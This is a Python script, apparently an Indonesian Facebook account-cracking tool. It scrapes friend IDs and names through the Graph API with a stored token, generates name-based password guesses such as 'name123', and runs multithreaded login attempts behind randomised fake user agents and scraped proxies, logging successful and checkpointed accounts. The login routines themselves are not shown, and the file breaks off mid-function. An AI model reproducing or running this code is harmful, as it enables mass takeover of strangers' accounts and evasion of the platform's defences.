import requests,re,random,sys,datetime,time,uuid,os,base64,json
from time import sleep
from rich.console import Console
from rich.panel import Panel
from concurrent.futures import ThreadPoolExecutor as AsepGanteng

ses = requests.Session()


###-----[ BAGIAN COLOR ]-----###
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +

ugen = []
for t in range(10000):
    rr = random.randint; rc = random.choice
#----------[ ATRIBUT USER AGENT IPHONE ]---------#     
    versi_iphone = str(rc(["9_3_5","10_3_3","15_4","14_3","13_5","14_5","13_4","17_2_1","12_3_1","17_3","17_2","14_2_1","16_6","13_2_1","14_4_2","12_5_7","9_3_5","11_0_3","11_2_1","9_1","10_2_1","8_3","8_1_2","11_2_6","10_3_2","10_3_1","10_3_3","11_3","10_1_1","11_3_1","11_0_2","10_3_3","10_1_1","10_2_2","9_3_5","11_2_6"]))
    mobile_iphone = str(rc(['13A404','13A344','13A4325c','13A452','13D15','13C75','13B143','13C75','12F69','12A365','12A405','12B410','12B470','12B36','12B440','11B554a','11B651','11D167','11D201','15E148','10A5397e','10A5388e','Y6MLQN','8G7LN3','2783VM','X35XFL','W5T30Y']))
    merek_device = str(rc(["Linux","X11","Macintosh","iPhone","iPad","Android","SmartTV","BlackBerry","SpreadTrum","MAUI Runtime","J2ME/MIDP","Series 60","MTK","iOS","Windows Mobile","Bada","BREW","Tizen"]))
    tipe_kamu = str(rc(["en-IE","ja-JP","pt-BR","de-DE","pl-PL","pt-PT","ru-RU","cs-CZ","de-DE","it-IT","es-BR","tr-TR","pl-PL"]))
    build = str(rc(['MRA58K','JOP24G','NRD90M','O11019','LMY47I','O00623'])) 
    tipe_oppo = str(rc(["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]))
    seri_cubot = str(rc(["MRA58K","JOP24G","NRD90M','O11019","LMY47I","O00623"]))
    versi_cubot = str(rc(["MAGIC","CUBOT","CUBOT_P20","CUBOT CHEETAH 2","CUBOT_NOVA","CUBOT NOTE Plus","CUBOT J9","CUBOT R11","CUBOT_MANITO","CUBOT KING KONG","CUBOT J3 PRO","CUBOT_J3","CUBOT_NOTE_S","CUBOT X18","CUBOT R9","CUBOT_POWER","CUBOT MAX","CUBOT_X18_Plus","CUBOT H3","CUBOT ECHO"]))
    tipe_cubot = str(rc(["Win64; x64","WOW64","Win32; x86","Trident"]))
    seri_viabrowser = str(rc(["N4LEFH","TQ2A","QQ1B","PQ1A","SQ3A","RD1B","LDK2WU","SD2A","AB03E'","Z367Q","R8638","C886H"]))
    model_android = str(rc(["RMX3472","RMX3611","RMX3396","RMX3572","RMX3706","RMX3396","RMX3610", "RMX3371", "RMX3572", "RMX3461", "RMX3311", "RMX3563", "RMX3371", "RMX3269", "RMX3370", "RMX3574", "RMX3661", "RMX3611"]))
    seri_katana = str(rc(["SP1A.210812.016","TP1A.220905.001","SP1A.210812.016","SP1A.210812.016","TP1A.220905.001","TP1A.220905.001","SP1A.210812.016","RKQ1.210503.001","TP1A.220905.001","RKQ1.211119.001","TP1A.220905.001","TP1A.220905.001","RP1A.201005.001","RP1A.201005.001","RKQ1.211119.001"]))
    versi_iphone = str(rc(["9_3_5","10_3_3","15_4","14_3","13_5","14_5","13_4","17_2_1","12_3_1","17_3","17_2","14_2_1","16_6","13_2_1","14_4_2","12_5_7","9_3_5","11_0_3","11_2_1","9_1","10_2_1","8_3","8_1_2","11_2_6","10_3_2","10_3_1","10_3_3","11_3","10_1_1","11_3_1","11_0_2","10_3_3","10_1_1","10_2_2","9_3_5","11_2_6"]))
    tipe_iphone = str(rc(["Y6MLQN","8G7LN3","2783VM","X35XFL","W5T30Y"]))
    tipe_opera = str(rc(["ar","pt","es","ja","ru','en","id","de","fr","en","pl","en-us","fa","da","zh","nl","ssr","el","ca","ta","bn","uk","tr","vi","cs","us"]))
    merek_opera = str(rc(["Macintosh","iPhone","iPad","Android","SmartTV","BlackBerry","SpreadTrum","MAUI Runtime","J2ME/MIDP","Series 60","MTK","iOS","Windows Mobile","Bada","BREW","Tizen"]))
    tipe_smbrowser = str(rc(["SM-A405FN","SM-A346M","SM-J415FN","SM-X706B","SM-J337R4","SM-A9000","SM-G532G","SM-J810M","SM-T280","Mi 9T Pro","Xiaomi 10 Pro","V2231","SM-M546B","22041219I","SM-N970F","SM-A700K","SM-A700S","KINGKONG 5","SC-05L","SAMSUNG SM-A245M","SM-A202K","SAMSUNG SM-A245F","SAMSUNG SM-A125F","SAMSUNG SM-G950U","SAMSUNG SM-A045F","SAMSUNG SM-G996U","SAMSUNG SM-W2021","Infinix X663C","SC-03K","SAMSUNG SM-A135F","SAMSUNG SM-A127F","SAMSUNG SM-J330F","SAMSUNG SM-A127F/A127FXXS7BVK1","SAMSUNG SM-A127F/A127FXXS8CWB1"]))
    tipe_infinix = str(rc(["X676B", "X687", "X609", "X697", "X680D", "X507", "X605", "X668", "X6815B", "X624", "X655F", "X689C", "X608", "X698", "X682B", "X682C", "X688C", "X688B", "X658E", "X659B", "X689B", "X689", "X689D", "X662", "X662B", "X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C", "X6816", "X6816D", "X668C", "X665B", "X665E", "X510", "X559C", "X559F", "X559", "X606", "X606C", "X606D", "X623", "X624B", "X625C", "X625D", "X625B", "X650D", "X650B", "X650", "X650C", "X655C", "X655D", "X680B", "X573", "X573B", "X622", "X693", "X695C", "X695D", "X695", "X663B", "X663", "X670", "X671", "X671B", "X672", "X6819", "X572", "X572-LTE", "X571", "X604", "X610B", "X690", "X690B", "X656", "X692", "X683", "X450", "X5010", "X501", "X401", "X626", "X626B", "X652", "X652A", "X652B", "X652C", "X660B", "X660C", "X660", "X5515", "X5515F", "X5515I", "X609B", "X5514D", "X5516B", "X5516C", "X627", "X680", "X653", "X653C", "X657", "X657B", "X657C", "X6511B", "X6511E", "X6511", "X6512", "X6823C", "X612B", "X612", "X503", "X511", "X352", "X351", "X530", "X676C", "X6821", "X6823", "X6827", "X509", "X603", "X6815", "X620B", "X620", "X687B", "X6811B", "X6810", "X6811"]))
    tipe_redmi = str(rc(["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]))
    versi_android = str(rc(['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','29','40']))
    kode_model = str(rc(['AC2003','Samsunh Galaxy S21','Google Pixel 6','OnePlus 10 Pro','Xiaomi Mi 11','Sony Xperia 1 III','Asus ROG Phone 6','Realme GT 2 Pro','Nokia X1000','Motorola Edge 30 Ultra','Huawei P60 Pro','LG Velvet 3','Oppo Find X5 Pro','Vivo X80 Pro+','Lenovo Legion Phone 4 Pro','Google Pixel 7','Xiaomi Redmi Note 12','Samsung Galaxy Z Fold 4','OnePlus Nord 4','Realme GT Neo 3','Sony Xperia 5 IV','Asus ZenFone 9','Motorola Moto G100','Nokia G500','LG Wing 2','Xiaomi Poco F4','Google Pixel 7a','Oppo Reno 7 Pro','Vivo Y90','Samsung Galaxy A53','OnePlus Nord CE 2','Realme Narzo 50','Sony Xperia 10 IV','Asus ZenFone 8 Flip','Motorola Moto E8','Nokia C30','LG K22','Xiaomi Black Shark 5','Google Pixel 7 Pro','Oppo A95','Vivo S10e','Samsung Galaxy M33','OnePlus 10 Lite','Realme Q4 Pro+','Sony Xperia L5','Asus ROG Phone 7','Motorola Moto X9','Nokia X20','LG Q92','Xiaomi Mi Mix 5','Google Pixel Fold','Oppo F21 Pro','Vivo NEX 6','Samsung Galaxy Note 22','OnePlus 10T','Realme V25','Sony Xperia Pro-1','Asus ZenFone 8 Mini','Motorola Defy+','Nokia 7.4','LG V70 ThinQ','Xiaomi Redmi K40 Ultra','Google Pixel 7a XL','Oppo Reno 7 SE','Vivo Y20s','Samsung Galaxy F23','OnePlus Nord N200','Realme C35','Sony Xperia 2','Asus ROG Phone 8','Motorola Moto G9 Play','Nokia X50','LG K32','Xiaomi Poco X4 Pro','Google Pixel 8','Oppo A75','Vivo S1 Prime','Samsung Galaxy A73','OnePlus 10R','Realme GT Neo 4','Sony Xperia L6','Asus ZenFone 9 Lite','Motorola Moto E10','Nokia G700','LG Wing 3','Xiaomi Black Shark 6','Google Pixel 8 Pro','Oppo Reno 8','Vivo Y15','Samsung Galaxy M43','OnePlus Nord CE 3','Realme Narzo 60','Sony Xperia 20','Asus ZenFone 10','Motorola Moto X10','Nokia C40','LG K42','Xiaomi Mi Mix 6','Google Pixel Flip','Oppo F30 Pro','Vivo S20 Ultra']))
#----------[ DAFTAR USER AGENT ]---------#  
    SAMSUNG = f"Mozilla/5.0 (Linux; Android {versi_android}; {kode_model}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,50))}.{str(rr(0,15))} Chrome/{str(rr(50,500))}.{str(rr(50,500))}.{str(rr(50,6000))}.{str(rr(50,500))} Mobile Safari/537.36"
    CUBOT = f"Mozilla/5.0 (Linux; Android {versi_android}; {kode_model} Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40,119))}.0.{str(rr(2000,7000))}.{str(rr(76,199))} Mobile"
    BAIDU = f"Mozilla/5.0 (Linux; Android {versi_android}; {kode_model} Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40,119))}.0.{str(rr(2000,7000))}.{str(rr(76,199))} Mobile Safari/537.36 T7/9.1 baidubrowser/{str(rr(6,8))}.{str(rr(1,25))}.{str(rr(1,25))}.{str(rr(1,200))} (Baidu; P1 {str(rr(1,10))}.{str(rr(1,10))}.{str(rr(1,10))})"
    CHROME = f"Mozilla/5.0 (Linux; Android {versi_android}; {kode_model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,500))}.{str(rr(50,500))}.{str(rr(50,6000))}.{str(rr(50,500))} Mobile Safari/537.36"
    UA_VIERA = f"viabrowser;Safary-Mozilla/5.0 ({merek_device}; U; Viera; {tipe_kamu}) AppleWebKit/537.11 (KHTML, like Gecko) Viera/{str(rr(1,116))}.{str(rr(1,116))}.{str(rr(1,116))} Chrome/{str(rr(1,116))}.{str(rr(1,116))}.{str(rr(1,2006))}.{str(rr(1,116))} Safari/537.11"
    UA_VIERAv2 = f"viabrowser;Safary-Mozilla/5.0 (Linux; U; Viera; {tipe_kamu}) AppleWebKit/537.36 (KHTML, like Gecko) Viera/{str(rr(1,116))}.{str(rr(1,116))}.{str(rr(1,116))} Chrome/{str(rr(1,116))}.{str(rr(1,116))}.{str(rr(1,4000))}.{str(rr(1,300))} Safari/537.36 SmartTV"
    UA_ONPI = f"viabrowser;Safary-Mozilla/5.0 (iPhone; CPU iPhone OS {versi_iphone} like Mac OS X) AppleWebKit/{str(rr(500,1000))}.{str(rr(2,100))} (KHTML, like Gecko) Version/{str(rr(1,25))}.{str(rr(4,80))} Mobile/{tipe_iphone} Safari/{str(rr(500,800))}.{str(rr(2,30))}"
    UA_KTN = f"Dalvik/2.1.0 (Linux; U; Android {str(rr(1,25))}; {model_android} Build/{seri_katana}) [FBAN/FB4A;FBAV/{str(rr(350,450))}.0.0.44.117;FBPN/com.facebook.katana;FBLC/in_ID;FBBV/{str(rr(41000000000,59999999999))};FBCR/Smartfren 100% untuk Indonesia;FBMF/realme;FBBD/realme;FBDV/RMX3760;FBSV/{str(rr(1,25))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1440};FB_FW/1;FBRV/0;] FBBK/1"
    UA_BCD = f"viabrowser;Safary-Mozilla/5.0 (Linux; Android {str(rr(1,25))}; {versi_cubot} Build/{seri_cubot}; wv)AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40,119))}.0.{str(rr(2000,7000))}.{str(rr(76,199))} Mobile"
    UA_VBRO = f"viabrowser;Safary-Mozilla/5.0 (Windows NT {str(rr(1,25))}; {tipe_cubot}){seri_viabrowser})AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(55,117))}.0.{str(rr(2883,4000))}.{str(rr(87,150))} UBrowser/{str(rr(7,30))}.0.{str(rr(185,299))}.{str(rr(1002,3000))} Safari/537.36"
    UA_VWIN = f"viabrowser;Safary-Mozilla/5.0 (Windows NT 10.0 .{str(rr(1,20))}; {tipe_cubot}){seri_viabrowser})Applewebkit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Safari/537.36 Vivaldi/6.0.2979.18"
    UA_PPOV = f"Mozilla/5.0 (Linux; U; Android {str(rr(1,25))};{tipe_oppo}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,109))}.0.{str(rr(4896,5414))}.{str(rr(118,127))} Mobile Safari/537.36 OPR/{str(rr(20,50))}.{str(rr(0,1))}.{str(rr(1000,4999))}.{str(rr(70000,209999))}"
    UA_MINUC = f"Mozilla/5.0 (Linux; Android {str(rr(1,25))}; SM-A207F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(1,100))}.0.{str(rr(2000,5000))}.{str(rr(1,100))} Mobile Safari/537.36 UCBrowser/11.5.2.1188(SpeedMode) U4/1.0 UCWEB/2.0 (UCMini) Mobile"
    UA_PRA = f"Opera/9.80 ({merek_opera}; Opera Mini/{str(rr(1,200))}.0.{str(rr(1,200))}/{str(rr(1,200))}.{str(rr(1,700))}; U; {tipe_opera}) Presto/{str(rr(1,200))}.{str(rr(1,300))}.{str(rr(1,6000))} Version/{str(rr(1,300))}.{str(rr(1,400))}"
    UA_SMBR = f"Mozilla/5.0 (Linux; Android {str(rr(1,35))}; {tipe_smbrowser} Build/RP1A.{str(rr(500,900000))}.{str(rr(1,500))}; wv) AppleWebKit/{str(rr(1,1000))}.{str(rr(1,500))} (KHTML, like Gecko) SamsungBrowser/{str(rr(1,1000))}.{str(rr(1,100))} Chrome/{str(rr(1,500))}.0.{str(rr(1,10000))}.{str(rr(1,100))} Mobile Safari/537.36"
    UA_IFN = f"Mozilla/5.0 (Linux; Android {str(rr(1,35))}; Infinix {tipe_infinix}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
    UA_RDM = f"Mozilla/5.0 (Linux; Android {str(rr(1,35))}; {tipe_redmi} Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
    UA_SMGT = f"SAMSUNG-GT-S3802 Opera/9.80 ({merek_opera}; Opera Mini/7.1.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {tipe_opera}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
    myuseragent = random.choice([SAMSUNG,CUBOT,BAIDU,CHROME,UA_VIERA,UA_VIERAv2,UA_ONPI,UA_KTN,UA_BCD,UA_VBRO,UA_VWIN,UA_PPOV,UA_MINUC,UA_PRA,UA_SMBR,UA_IFN,UA_RDM,UA_SMGT])
    ugen.append(myuseragent)

try:
    proxy = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all').text
    open('RESULT/.proxy.txt','w').write(proxy)
except Exception as e:
    proxy = open('RESULT/.proxy.txt','r').read().splitlines()

class VALIDATE:
    def __init__(self):
        self.loop,self.cps,self.oks,self.a2f = 0,0,0,0
        self.id,self.uid,self.uid2 = [],[],[]
        self.double = []
        self.pwnya,self.metode,self.ugen = [],[],[]
        self.dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'July','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
        self.dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'July','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
        self.tgl = datetime.datetime.now().day
        self.bln = self.dic[(str(datetime.datetime.now().month))]
        self.tahun = datetime.datetime.now().year
        self.okc = 'OK-'+str(self.tgl)+'-'+str(self.bln)+'-'+str(self.tahun)+'.txt'
        self.cpc = 'CP-'+str(self.tgl)+'-'+str(self.bln)+'-'+str(self.tahun)+'.txt'
    
    def AsepGanteng(self,yusup):
        for e in yusup + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            sleep(0.05)
    
    def crack_file(self):
        try:vin = os.listdir('DUMP/')
        except FileNotFoundError:
            Console(width=50, style="bold green").print(Panel("[italic white]Dump Tidak Ditemukan[italic white]"))
            time.sleep(2)
            exit()
        if len(vin)==0:
            print('') 
            Console(width=50, style="bold green").print(Panel("[italic white]Dump Tidak Ditemukan[italic white]",subtitle="╭───",subtitle_align="left"))
            kontol = Console().input("[bold green]   ╰─> (y/t) ")
            if kontol in ['']:
                Console(width=50, style="bold green").print(Panel("[italic white]Input Tidak Boleh Kosong[italic white]"))
            elif kontol in ['y','Y']:
                Console(width=50, style="bold green").print(Panel("[italic white]Memuat...[italic white]"))
                time.sleep(3)
                exit()
            elif kontol in ['t','T']:
                Console(width=50, style="bold green").print(Panel("[italic white]Anda Tolol...[italic white]"))
                time.sleep(3)
                exit()
            Console(width=50, style="bold green").print(Panel("[italic white]File Tidak Ditemukan[italic white]"))
            time.sleep(2)
            exit()
        else:
            cih = 0
            lol = {}
            for isi in vin:
                try:hem = open('DUMP/'+isi,'r').readlines()
                except:continue
                cih+=1
                if cih<100:
                    nom = ''+str(cih)
                    lol.update({str(cih):str(isi)})
                    lol.update({nom:str(isi)})
                    Console(width=50, style="bold green").print(Panel(f"[italic white]%s.%s ({h} %s{x} idz )"%(nom,isi,len(hem))))
                else:
                    lol.update({str(cih):str(isi)})
                    Console(width=50, style="bold green").print(Panel(f"[italic white]"+str(cih)+". "+isi+" [ "+str(len(hem))+" Account ]"+x))
                    Console(width=50, style="bold green").print(Panel(f"[italic white]%s. %s ({h} %s{x} idz )"%(cih,isi,len(hem))))
            geeh = Console().input("[bold green]   ╰─> ")
            try:geh = lol[geeh]
            except KeyError:
                Console(width=50, style="bold green").print(Panel("[italic white]Pilih Yang Bener Asuhh[italic white]"))
                time.sleep(3)
                exit()
            try:lin = open('DUMP/'+geh,'r').read().splitlines()
            except:
                Console(width=50, style="bold green").print(Panel("[italic white]File Tidak Ditemukan[italic white]"))
                time.sleep(2)
                exit()
            for xid in lin:
                self.id.append(xid)    
            self.setting()

    def dump_massal(self):
        try:
            token = open('.tok.txt','r').read()
            cok = open('.cok.txt','r').read()
        except (IOError,KeyError,FileNotFoundError):
            Console(width=50, style="bold green").print(Panel("[italic white]Cookies Mati...[italic white]"))
            exit()
        try:
            Console(width=50, style="bold green").print(Panel("[italic white]Cari ID Yang Tidak Perivat,Usahkan Cari ID Deket Daerah Kamu Biar Hasil [bold green]( IJO )[/] Masukan ID Target [bold red]Contoh[/] [bold green]100092235011928[/] Kalu Pengen Dump Id Banya Kasih [bold green]( , )[/] Kaya Contoh Di Bawah\n[bold green]61564919994826[/],[bold green]61560115013873[/],[bold green]100092235011928 [italic white] [italic white]",subtitle="╭───",subtitle_align="left"))
            xx = Console().input("[bold green]   ╰─> ")
        except ValueError:
            Console(width=50, style="bold green").print(Panel("[italic white]Input Salah...[italic white]"))
            exit()
        if str(xx) == '':
            Console(width=50, style="bold green").print(Panel("[italic white]Gagal Dump Kemungkinan ID Perivat...[italic white]"))
            exit()
        ses = requests.Session()
        jumlah = xx.split(',')
        for xmx in jumlah:
            self.uid.append(xmx)
        for user in self.uid:
            try:
                url = ses.get(f"https://graph.facebook.com/{user}?fields=friends&access_token={token}",cookies = {'cookies':cok}).json()
                for x in url['friends']['data']:
                    try:
                        Console(width=50, style="bold green").print(f"[italic white]Tunggu Sedang Dump ID... {len(self.id)}",end="\r")
                        self.id.append(x['id']+'|'+x['name'])
                    except:continue
            except (KeyError,IOError):pass
        try:
            self.setting()
        except requests.exceptions.ConnectionError:print("Tidak Ada Koneksi Internet");exit()

    def setting(self):
        Console(width=50, style="bold green").print(Panel("[italic white]1. Muda\n[italic white]2. Random [italic white]",subtitle="╭───",subtitle_align="left"))
        urutan_setting = Console().input("[bold green]   ╰─> ")
        if urutan_setting in ['1','01','new']:
            muda=[]
            for new in sorted(self.id):
                muda.append(new)
            bcm=len(muda)
            bcmi=(bcm-1)
            for xmud in range(bcm):
                self.uid2.append(muda[bcmi])
                bcmi -=1
        elif urutan_setting in ['2','02','random']:
            for acak in self.id:
                xx = random.randint(0,len(self.uid2))
                self.uid2.insert(xx,acak)
        else:
            Console(width=50, style="bold green").print(Panel("[italic white]Input Salah...[italic white]"))
            exit()
        Console(width=50, style="bold green").print(Panel("[italic white]1. api\n2. validate[italic white]",subtitle="╭───",subtitle_align="left"))
        login_metode = Console().input("[bold green]   ╰─> ")
        if login_metode in ['1','01','validate']:
            self.metode.append("valid")
        elif login_metode in ['2','02','regular']:
            self.metode.append("regular")
        else:Console(width=50, style="bold green").print(Panel("[italic white]Input Salah...[italic white]")),exit()
        self.Validate()


    def Validate(self):
        Console(width=50, style="bold green").print(Panel("[italic white]Masukan Password Tambhan [bold red]Contoh[/]\n[bold green]kamu nanya[/],[bold green]Asep Ganteng[/],[bold green]Indonesia[italic white][italic white]",subtitle="╭───",subtitle_align="left"))
        pw = Console().input("[bold green]   ╰─> ")
        pw_nya = pw.split(',')
        for xxs in pw_nya:
            self.pwnya.append(xxs)
        Console(width=50, style="bold green").print(Panel(f"[italic white]Mainkan Mode Pesawat setiap [bold red]200[/] Detik,Trik Biar dapet Hasil [bold green]( IJO )[/] Usahkan Cari ID New[italic white]\n[bold green]{self.okc}[italic white]\n[bold red]{self.cpc}[italic white]"))
        with AsepGanteng(max_workers=35) as AsepYusup:
            for user in self.uid2:
                uid,nama = user.split('|')[0],user.split('|')[1].lower()
                depan = nama.split(" ")[0]
                pasw = []
                try:
                    if len(nama)<6:
                        if len(depan)<3:pass
                        else:
                            pasw.append(nama)
                            pasw.append(depan+"123")
                            pasw.append(depan+"1234")
                            pasw.append(depan+"12345")
                            pasw.append(depan+"321")
                            pasw.append(depan+"2024")
                            pasw.append(depan+" 123")
                            pasw.append(depan+" 1234")
                            pasw.append(depan+" 12345")
                            pasw.append(depan+" 321")
                            pasw.append(depan+"!$@%")
                            pasw.append(depan+" !$@%")
                    else:
                        if len(depan)<3:
                            pasw.append(nama)
                        else:
                            pasw.append(nama)
                            pasw.append(depan+"123")
                            pasw.append(depan+"1234")
                            pasw.append(depan+"12345")
                            pasw.append(depan+"321")
                            pasw.append(depan+"2024")
                            pasw.append(depan+" 123")
                            pasw.append(depan+" 1234")
                            pasw.append(depan+" 12345")
                            pasw.append(depan+" 321")
                            pasw.append(depan+"!$@%")
                            pasw.append(depan+" !$@%")
                    for xx in self.pwnya:
                        pasw.append(xx)
                    if 'valid' in self.metode:
                        AsepYusup.submit(self._validate_,uid,pasw)
                    elif 'regular' in self.metode:
                        AsepYusup.submit(self._regular_,uid,pasw)
                    else:pass
                except:pass
        print("\r")
        Console(width=50, style="bold green").print(Panel(f"[italic white]sukses crack {len(self.uid2)} id,dengan jumlah hasil Live : {self.oks} Chek : {self.cps}[italic white]"))
    
    def ua_asep(self):
        self.andro_verison = random.choice(["13","12","11", "10", "9", "8", "7", "6", "5"])
        self.andro_rmx = random.choice(["in-id","en-US","en-us","en-gb"])
        self.andro_Bulid = random.choice(["RKQ1.201217.002","QKQ1.200614.002"])
        self.stv = random.choice(["Tizen5.0","Tizen 8.0","Tizen 7.0","Tizen 5.5","Tizen 4.0.0.2","Tizen2.3","Tizen2.4.0","Tizen 8.0","Tizen-WASM 6.0","Tizen 6.0","Tizen 6.5"])
        self.ua_sya = f"Mozilla/5.0 (Linux; U; Android {self.andro_verison}; {self.andro_rmx}; RMX2195 Build/{self.andro_Bulid}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(50,150))}.0.{str(random.randint(2000,4999))}.{str(random.randint(5,150))} Mobile Safari/537.36 HeyTapBrowser/{str(random.randint(1,50))}.{str(random.randint(5,100))}.{str(random.randint(1,15))}.{str(random.randint(5,30))}"
        self.ua_sya1 = f"Mozilla/5.0 (Linux; U; Android {self.andro_verison}; {self.andro_rmx}; RMX2195 Build/{self.andro_Bulid}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(50,150))}.0.{str(random.randint(2000,4999))}.{str(random.randint(50,299))} UCBrowser/{str(random.randint(10,100))}.{str(random.randint(10,100))}.{str(random.randint(10,100))}.{str(random.randint(1000,2000))} Mobile Safari/537.36"
        self.ua_sya2 = f"Mozilla/5.0 (Linux; Android {self.andro_verison}; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(50,150))}.0.{str(random.randint(2000,5999))}.{str(random.randint(50,299))} Mobile Safari/537.36"
        self.smrt = f"Mozilla/5.0(SMART-TV;{self.stv})AppleWebKit/537.36(KHTML,likeGecko)SamsungBrowser/2.2Chrome/{str(random.randint(50,150))}.0.{str(random.randint(2000,5999))}.{str(random.randint(50,299))}TVSafari/537.36"
        return random.choice(["ua_sya","ua_sya1","ua_sya2","smrt"])
    
    def ____ua____(self):
        model = random.choice(['CPH2071', 'CPH2209'])
